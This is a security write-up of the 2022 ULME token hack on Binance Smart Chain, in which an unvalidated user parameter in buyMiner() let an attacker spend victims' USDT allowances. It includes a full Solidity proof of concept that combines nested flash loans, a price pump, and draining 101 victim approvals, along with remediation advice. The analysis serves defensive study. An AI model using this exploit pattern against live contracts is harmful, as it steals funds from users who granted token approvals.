# ULME — buyMiner() Victim Allowance Drain Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | ULME Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~$250,000 (attacker net profit ~$50,000) |
| **Vulnerable Contract** | [0xAE975a25646E6eB859615d0A147B909c13D31FEd](https://bscscan.com/address/0xAE975a25646E6eB859615d0A147B909c13D31FEd) (ULME Token) |
| **Attack Contract** | [0x8523c7661850d0da4d86587ce9674da23369ff26](https://bscscan.com/address/0x8523c7661850d0da4d86587ce9674da23369ff26) |
| **Attacker** | [0x056c20ab7e25e4dd7e49568f964d98e415da63d3](https://bscscan.com/address/0x056c20ab7e25e4dd7e49568f964d98e415da63d3) |
| **ULME-BUSD LP** | [0xf18e5EC98541D073dAA0864232B9398fa183e0d4](https://bscscan.com/address/0xf18e5EC98541D073dAA0864232B9398fa183e0d4) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **DODO Pool 1** | [0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE](https://bscscan.com/address/0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE) |
| **DODO Pool 2** | [0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A](https://bscscan.com/address/0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) |
| **Attack Transaction** | [0xdb9a13bc...](https://bscscan.com/tx/0xdb9a13bc970b97824e082782e838bdff0b76b30d268f1d66aac507f1d43ff4ed) |
| **Root Cause** | `buyMiner(address user, uint256 usdt)` function consumes the USDT allowance of an arbitrary address without validating the `user` parameter |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/ULME_exp.sol) |

---
## 1. Vulnerability Overview

The `buyMiner(address user, uint256 usdt)` function in the ULME token was intended to allow users to purchase miners by paying USDT. Internally, the function executed `USDT.transferFrom(user, contract, usdt)`, but it did not enforce `user` to be `msg.sender`, allowing an arbitrary address to be specified. The attacker secured ~$560K USDT via a double flash loan from DODO, first pumped the ULME price, then sequentially passed the addresses of 101 victim users — who had previously approved the ULME contract to spend their USDT — as the `user` parameter and called `buyMiner()`. As victims' USDT flowed into the contract to purchase ULME, the attacker sold the ULME they had already acquired to realize the profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable buyMiner() — no validation of user parameter
contract ULMEToken {
    IERC20 public USDT;

    // ❌ user parameter is not enforced to be msg.sender
    function buyMiner(address user, uint256 usdt) external {
        // ❌ user can be an arbitrary address
        // By specifying a victim who has approved the ULME contract to spend their USDT as user,
        // the victim's USDT can be spent on their behalf
        USDT.transferFrom(user, address(this), usdt);

        // Purchase ULME with USDT and send to user
        uint256 ulmeAmount = usdt * EXCHANGE_RATE / 1e18;
        _transfer(address(this), user, ulmeAmount);
    }
}

// ✅ Correct pattern — enforce msg.sender
contract SafeULMEToken {
    function buyMiner(uint256 usdt) external {
        // ✅ Must use the caller's own USDT
        USDT.transferFrom(msg.sender, address(this), usdt);
        uint256 ulmeAmount = usdt * EXCHANGE_RATE / 1e18;
        _transfer(address(this), msg.sender, ulmeAmount);
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**ULME_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: `buyMiner(address user, uint256 usdt)` function consumes the USDT allowance of an arbitrary address without validating the `user` parameter
    function buyMiner(address arg0, uint256 arg1) external view returns (uint256) {}  // 0x8a43bb01  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan from DODO Pool 1 (USDT)
    │       DPPFlashLoanCall() callback1
    │
    ├─[2] Nested flash loan from DODO Pool 2 (USDT)
    │       DPPFlashLoanCall() callback2
    │       Total ~$560K USDT secured
    │
    ├─[3] Swap USDT → ULME (PancakeSwap)
    │       ULME price rises (attacker bulk-buys)
    │
    ├─[4] Iterate over 101 victims:
    │       Call buyMiner(victim, victimAllowance)
    │       ❌ No user validation
    │       → USDT.transferFrom(victim, ULME_contract, amount)
    │       → Victim's USDT purchases ULME → ULME supply increases
    │
    ├─[5] Swap ULME → USDT (PancakeSwap reverse swap)
    │       (Sell before price drops from increased ULME supply in step 4)
    │
    ├─[6] Repay DODO Pool 2
    ├─[7] Repay DODO Pool 1
    │
    └─[8] Net profit: ~$50,000 USDT
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IULME {
    // ❌ No validation of user parameter
    function buyMiner(address user, uint256 usdt) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IDODO {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract ULMEExploit is Test {
    IULME ulme       = IULME(0xAE975a25646E6eB859615d0A147B909c13D31FEd);
    IDODO dodo1      = IDODO(0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE);
    IDODO dodo2      = IDODO(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IPancakeRouter router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 USDT      = IERC20(0x55d398326f99059fF775485246999027B3197955);

    address[] victims; // Pre-collected victim addresses

    uint256 step;

    function setUp() public {
        vm.createSelectFork("bsc", 22_476_695);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT balance", USDT.balanceOf(address(this)), 18);

        step = 1;
        dodo1.flashLoan(560_000 * 1e18, 0, address(this), abi.encode(1));

        emit log_named_decimal_uint("[End] USDT balance", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata data) external {
        uint256 s = abi.decode(data, (uint256));

        if (s == 1) {
            // [Step 2] Nested flash loan
            dodo2.flashLoan(560_000 * 1e18, 0, address(this), abi.encode(2));
            USDT.transfer(address(dodo1), amount);

        } else if (s == 2) {
            // [Step 3] USDT → ULME (price pump)
            USDT.approve(address(router), type(uint256).max);
            address[] memory path = new address[](2);
            path[0] = address(USDT);
            path[1] = address(ulme);
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                USDT.balanceOf(address(this)),
                0, path, address(this), block.timestamp
            );

            // [Step 4] Drain allowances of 101 victims
            for (uint256 i = 0; i < victims.length; i++) {
                address victim = victims[i];
                uint256 victimAllowance = USDT.allowance(victim, address(ulme));
                uint256 victimBalance   = USDT.balanceOf(victim);
                uint256 drainAmount     = victimAllowance < victimBalance ? victimAllowance : victimBalance;
                if (drainAmount == 0) continue;

                // ⚡ user = victim, consuming victim's USDT allowance
                ulme.buyMiner(victim, drainAmount);
            }

            // [Step 5] ULME → USDT reverse swap
            ulme.approve(address(router), type(uint256).max);
            path[0] = address(ulme);
            path[1] = address(USDT);
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                ulme.balanceOf(address(this)),
                0, path, address(this), block.timestamp
            );

            // Repay Pool 2
            USDT.transfer(address(dodo2), amount);
        }
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | buyMiner() unvalidated user parameter → victim allowance drain |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Arbitrary Call Vulnerability (victim allowance drain) |
| **Attack Vector** | Double DODO flash loan → ULME price manipulation → `buyMiner(victim, amount)` × 101 |
| **Preconditions** | `buyMiner()` user parameter unvalidated; victims have approved the ULME contract to spend their USDT |
| **Impact** | ~$250,000 victim USDT lost; attacker net profit ~$50,000 |

---
## 6. Remediation Recommendations

1. **Enforce msg.sender**: In `buyMiner(address user, ...)`, `user` must always equal `msg.sender`. Add `require(user == msg.sender, "Invalid user")`, or remove the `user` parameter entirely and use `msg.sender` directly.
2. **Caution with allowance-based patterns**: In any pattern where a contract executes `transferFrom` on behalf of a user, always guarantee that `from == msg.sender`.
3. **Price manipulation defense**: To guard against the compound attack of flash-loan-based price pumping combined with victim allowance draining, add minimum output validation and slippage protection to swap/purchase functions.

---
## 7. Lessons Learned

- **Danger of the buyMiner pattern**: Any function of the form `buy*(address user, uint256 amount)` that purchases on behalf of an externally specified `user` is always an allowance drain vector if `user` can be set by the caller.
- **Compound attack structure**: This attack combined a simple access control vulnerability with flash-loan-based price manipulation. It demonstrates how a single vulnerable function can be leveraged as part of a far more complex attack chain.
- **Double DODO flash loan**: The pattern of nesting multiple DODO pool calls to source capital that a single flash loan cannot cover appears repeatedly. For attacks requiring large capital, nested flash loans have become a standard technique.